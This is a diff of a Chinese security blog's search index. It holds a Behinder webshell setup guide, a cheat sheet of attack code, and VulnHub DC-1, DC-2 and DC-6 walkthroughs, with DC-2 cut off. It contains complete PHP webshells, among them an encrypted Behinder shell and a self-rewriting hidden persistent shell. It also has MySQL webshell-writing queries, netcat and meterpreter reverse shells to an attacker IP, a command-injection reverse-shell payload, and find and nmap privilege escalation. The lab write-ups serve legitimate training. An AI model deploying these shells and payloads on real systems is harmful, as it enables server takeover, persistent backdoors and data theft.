@@ -1,285 +1,648 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search> 
-  
-  
-    
-    <entry>
-      <title>Behinder冰蝎</title>
-      <link href="/2022/04/28/Behinder/"/>
-      <url>/2022/04/28/Behinder/</url>
-      
-        <content type="html"><![CDATA[<p>最近尝试使用冰蝎这个工具，期间踩了很多坑，这里记录一下<br>冰蝎下载地址：<a href="https://github.com/rebeyond/Behinder/releases">https://github.com/rebeyond/Behinder/releases</a></p><p><img src="/2022/04/28/Behinder/1.png" alt="img"></p><p>这里我们选择zip下载，然后解压，<br>这里出现第一个坑：<br>大家可能会只装了java16，因为我们的burp抓包工具，需要用java16环境，java8不行<br>但我们的冰蝎在java16下打不开，java8可以，所以我们在这里也把java8安装一下<br><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a><br>安装完后，记录好你安装的路径<br>在冰蝎目录下建议一个文件<br>Behinder_start.bat</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> D:\Java\jdk-se8\bin //java8路径</span><br><span class="line">start javaw  -jar D:\tools\Behinder_v3.0_Beta_7\Behinder.jar //冰蝎路径</span><br></pre></td></tr></table></figure><p>然后我们运作这个bat就能打开冰蝎了</p><p><img src="/2022/04/28/Behinder/2.png" alt="img"></p><p>冰蝎不能用普通的一句话木马连接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">        <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">    <span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">        <span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">              </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">                 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果要修改连接密码则将自己的密码进行md5加密然后取其前16位替换$key的值</p><p><img src="/2022/04/28/Behinder/3.png" alt="img"></p><p>连接成功</p>]]></content>
-      
-      
+<search>
+  <entry>
+    <title>Behinder冰蝎</title>
+    <url>/2022/04/28/Behinder/</url>
+    <content><![CDATA[<p>最近尝试使用冰蝎这个工具，期间踩了很多坑，这里记录一下<br>冰蝎下载地址：<a href="https://github.com/rebeyond/Behinder/releases">https://github.com/rebeyond/Behinder/releases</a></p>
+<p><img src="/2022/04/28/Behinder/1.png" alt="img"></p>
+<p>这里我们选择zip下载，然后解压，<br>这里出现第一个坑：<br>大家可能会只装了java16，因为我们的burp抓包工具，需要用java16环境，java8不行<br>但我们的冰蝎在java16下打不开，java8可以，所以我们在这里也把java8安装一下<br><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a><br>安装完后，记录好你安装的路径<br>在冰蝎目录下建议一个文件<br>Behinder_start.bat</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> D:\Java\jdk-se8\bin //java8路径</span><br><span class="line">start javaw  -jar D:\tools\Behinder_v3.0_Beta_7\Behinder.jar //冰蝎路径</span><br></pre></td></tr></table></figure>
+
+<p>然后我们运作这个bat就能打开冰蝎了</p>
+<p><img src="/2022/04/28/Behinder/2.png" alt="img"></p>
+<p>冰蝎不能用普通的一句话木马连接</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">        <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">    <span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">        <span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">              </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">                 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果要修改连接密码则将自己的密码进行md5加密然后取其前16位替换$key的值</p>
+<p><img src="/2022/04/28/Behinder/3.png" alt="img"></p>
+<p>连接成功</p>
+]]></content>
       <categories>
-          
-          <category> 工具 </category>
-          
+        <category>工具</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> 工具 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>常用代码汇总（施工中。。。）</title>
-      <link href="/2022/04/22/%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E6%B1%87%E6%80%BB/"/>
-      <url>/2022/04/22/%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E6%B1%87%E6%80%BB/</url>
-      
-        <content type="html"><![CDATA[<h2 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;L1ang&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydMMWFuZyddKTs/Pg==&quot;</span>|<span class="built_in">base64</span> -d &gt; shell.php</span><br></pre></td></tr></table></figure><p>php内存马（不死马）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);   <span class="comment">//1表示，忽略与客户端断开连接，继续执行</span></span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);       <span class="comment">//隐藏当前文件</span></span><br><span class="line">    <span class="variable">$file</span>=<span class="string">&quot;.shell.php&quot;</span>;</span><br><span class="line">    <span class="variable">$shell</span>=<span class="string">&quot;&lt;?php unlink(__FILE__);substr(md5(\$_GET[&#x27;user&#x27;]),28)==&#x27;ec6b&#x27;&amp;&amp;eval(\$_POST[&#x27;attack&#x27;]);?&gt;&quot;</span>; <span class="comment">#md5=L1ang</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$shell</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&#x27;chmod 777 .shell.php&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">touch</span>(<span class="string">&quot;.shell.php&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="mysql木马注入"><a href="#mysql木马注入" class="headerlink" title="mysql木马注入"></a>mysql木马注入</h3><p>日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">条件：</span><br><span class="line">    general_log = on;</span><br><span class="line">    general_log_file = <span class="string">&#x27;路径&#x27;</span>;</span><br><span class="line">利用：</span><br><span class="line">    select <span class="string">&#x27;&lt;?php eval($_POST[L1ang]);?&gt;&#x27;</span>    </span><br></pre></td></tr></table></figure><p>写入文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">条件：</span><br><span class="line">    mysql连接用户有file权限</span><br><span class="line">    secure-file-priv不为null</span><br><span class="line">利用：</span><br><span class="line">    select <span class="string">&#x27;&lt;?php @eval($_POST[L1ang])?&gt;&#x27;</span> INTO OUTFILE <span class="string">&#x27;路径&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="交互shell"><a href="#交互shell" class="headerlink" title="交互shell"></a>交互shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>存活主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP IP段</span><br></pre></td></tr></table></figure><p>端口探测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p- IP</span><br></pre></td></tr></table></figure><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u url -e *</span><br></pre></td></tr></table></figure><h3 id="nc监听"><a href="#nc监听" class="headerlink" title="nc监听"></a>nc监听</h3><p>kali(攻击机)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lpnv 4444</span><br></pre></td></tr></table></figure><p>目标机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc ip 4444 -e /bin/bash </span><br></pre></td></tr></table></figure><h3 id="cms信息扫描"><a href="#cms信息扫描" class="headerlink" title="cms信息扫描"></a>cms信息扫描</h3><h4 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url url --enumerate</span><br></pre></td></tr></table></figure><h4 id="joomla"><a href="#joomla" class="headerlink" title="joomla"></a>joomla</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan --url url</span><br></pre></td></tr></table></figure><h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload payload/php/meterpreter/reverse_tcp //payload根据实际环境选择</span><br><span class="line"><span class="built_in">set</span> lhost IP //攻击机ip</span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw &gt; shell.php //生成shell，上传到目标机，LHOST为攻击机IP</span><br><span class="line">run</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
+      <tags>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>渗透-DC1</title>
+    <url>/2022/04/15/DC-1/</url>
+    <content><![CDATA[<p>渗透环境：DC1<br>攻击机：192.168.138.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>靶机环境：<a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="使用nmap扫描存活的主机"><a href="#使用nmap扫描存活的主机" class="headerlink" title="使用nmap扫描存活的主机"></a>使用nmap扫描存活的主机</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap  -sP 192.168.138.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/15/DC-1/1.png" alt="img"></p>
+<p>192.168.178.129：目标主机</p>
+<h3 id="扫描目标主机对外开放的端口"><a href="#扫描目标主机对外开放的端口" class="headerlink" title="扫描目标主机对外开放的端口"></a>扫描目标主机对外开放的端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">namp -sS -p- 192.168.178.129</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/15/DC-1/2.png" alt="img"></p>
+<p>发现开启了端口80<br>浏览192.168.178.129:80</p>
+<p><img src="/2022/04/15/DC-1/3.png" alt="img"></p>
+<p>查看Wappalyzer</p>
+<p><img src="/2022/04/15/DC-1/4.png" alt="img"></p>
+<p>发现cms为Drupal，这版本有点low，估计有漏洞</p>
+<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>使用msf</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search drupal</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/15/DC-1/5.png" alt="img"></p>
+<p>这里我们选择exploit&#x2F;multi&#x2F;http&#x2F;drupal_drupageddon</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use 2</span><br><span class="line">options//查看需要设置的参数</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.178.129//设置目标ip</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>成功后我们执行ls，查看当前目录</p>
+<p><img src="/2022/04/15/DC-1/6.png" alt="img"></p>
+<p>发现flag1.txt，打开查看</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/15/DC-1/7.png" alt="img"></p>
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>到这里，上传个一句话木马看看</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">upload /data/shell.php</span><br></pre></td></tr></table></figure>
+
+<p>用蚁剑进行连接</p>
+<p><img src="/2022/04/15/DC-1/8.png" alt="img"></p>
+<p>找找第二个flag在哪<br>最后发现在settings.php中</p>
+<p><img src="/2022/04/15/DC-1/9.png" alt="img"></p>
+<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>里面还有数据库的账号密码，也发现是mysql<br>在msf上传个交互shell, 然后连接mysql</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">mysql -u dbuser -p </span><br><span class="line">R0ck3t</span><br></pre></td></tr></table></figure>
+
+<p>然后就常规的，查库，查表，查列，爆内容</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show databases; </span><br><span class="line">use drupaldb; </span><br><span class="line">show tables; </span><br><span class="line">select * from <span class="built_in">users</span>; </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/15/DC-1/10.png" alt="img"></p>
+<p>这里admin的密码被加密了，我们选择update的方式改为我们知道的密码<br>其中drupal可以通过password-hash.sh生成新的密码<br>我们在www目录执行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php scripts/password-hash.sh admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/15/DC-1/11.png" alt="img"></p>
+<p>sql中的替换语句</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update <span class="built_in">users</span> <span class="built_in">set</span> pass=<span class="string">&#x27;$S$DtPgSa61SbR1DXIh4wWcMft/rOmsKXcgvxTUAgenIMRbH65ZUAZu&#x27;</span> <span class="built_in">where</span> name=<span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>用账号：admin 密码：admin ，登录192.168.178.129:80查看里面信息</p>
+<p><img src="/2022/04/15/DC-1/12.png" alt="img"></p>
+<h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>在home目录下发现flag4.txt</p>
+<p><img src="/2022/04/15/DC-1/13.png" alt="img"></p>
+<h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>所以我们要提权到root，这里我们用find提权</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/15/DC-1/14.png" alt="img"></p>
+<p>发现find能利用<br>在&#x2F;tmp目录下创建command文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> <span class="built_in">command</span></span><br><span class="line">find <span class="built_in">command</span> -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/15/DC-1/15.png" alt="img"></p>
+<p>发现获得root权限了<br>修改命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find <span class="built_in">command</span> -<span class="built_in">exec</span> <span class="built_in">ls</span> /root \; </span><br><span class="line">find <span class="built_in">command</span> -<span class="built_in">exec</span> <span class="built_in">cat</span> /root/thefinalflag.txt \; </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/15/DC-1/16.png" alt="img"></p>
+<p>到处为止DC-1完成</p>
+]]></content>
       <categories>
-          
-          <category> 学习 </category>
-          
+        <category>实践</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> 提权 </tag>
-            
-            <tag> 木马 </tag>
-            
-            <tag> 命令 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>DC-6</title>
-      <link href="/2022/04/22/DC-6/"/>
-      <url>/2022/04/22/DC-6/</url>
-      
-        <content type="html"><![CDATA[<p>渗透环境：DC6 <a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机存活扫描"><a href="#主机存活扫描" class="headerlink" title="主机存活扫描"></a>主机存活扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure><p><img src="/2022/04/22/DC-6/1.png" alt="img"></p><p>靶机ip为192.168.168.134</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p- 192.168.168.134</span><br></pre></td></tr></table></figure><p><img src="/2022/04/22/DC-6/2.png" alt="img"></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://wordy/ -e *</span><br></pre></td></tr></table></figure><p><img src="/2022/04/22/DC-6/4.png" alt="img"></p><p>发现wordpress后台</p><h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>使用wpscan扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy  --enumerate</span><br></pre></td></tr></table></figure><p>发现存在的用户</p><p><img src="/2022/04/22/DC-6/3.png" alt="img"></p><p>使用burp进行爆破，失败<br>在原文下发现提示</p><p><img src="/2022/04/22/DC-6/5.png" alt="img"></p><p>使用提示中的字典</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br></pre></td></tr></table></figure><p>爆破成功</p><p><img src="/2022/04/22/DC-6/6.png" alt="img"></p><p>登录后台寻找突破口<br>发现一次存在命令执行的地方<br>在kali开启监听端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure><p>抓包修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | nc 192.168.168.128 4444 -e /bin/bash</span><br></pre></td></tr></table></figure><p>发送<br>上传木马</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydMMWFuZyddKTs/Pg==&quot;</span>|<span class="built_in">base64</span> -d &gt; shell.php</span><br></pre></td></tr></table></figure><p>蚁剑连接<br>在home下发现线索</p><p><img src="/2022/04/22/DC-6/8.png" alt="img"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>ssh连接<br>账号：graham<br>密码：GSo7isUM1D4</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/2022/04/22/DC-6/9.png" alt="img"></p><p>发现 &#x2F;home&#x2F;jens&#x2F;backups.sh没有密码<br>往里面添上&#x2F;bin&#x2F;bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> /bin/bash &gt;&gt; /home/jens/backups.sh</span><br></pre></td></tr></table></figure><p>以jens的身份执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u jens /home/jens/backups.sh</span><br></pre></td></tr></table></figure><p>发现当前身份变为jens</p><p><img src="/2022/04/22/DC-6/10.png" alt="img"></p><p>nmap提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;os.execute(&quot;/bin/bash&quot;)&#x27;</span> &gt; /tmp/shell</span><br><span class="line">sudo  nmap  --script= /tmp/shell</span><br></pre></td></tr></table></figure><p>提权成功</p><p><img src="/2022/04/22/DC-6/11.png" alt="img"></p><p>查看flag</p><p><img src="/2022/04/22/DC-6/12.png" alt="img"></p><p>DC-6 clear</p>]]></content>
-      
-      
+      <tags>
+        <tag>渗透</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC-2</title>
+    <url>/2022/04/15/DC-2/</url>
+    <content><![CDATA[<p>渗透环境: DC-2  <a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a><br>攻击机：192.168.168.128<br>靶机：靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><h3 id="使用nmap扫描存活的主机"><a href="#使用nmap扫描存活的主机" class="headerlink" title="使用nmap扫描存活的主机"></a>使用nmap扫描存活的主机</h3><p>老规矩上nmap</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">namp -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure>
+
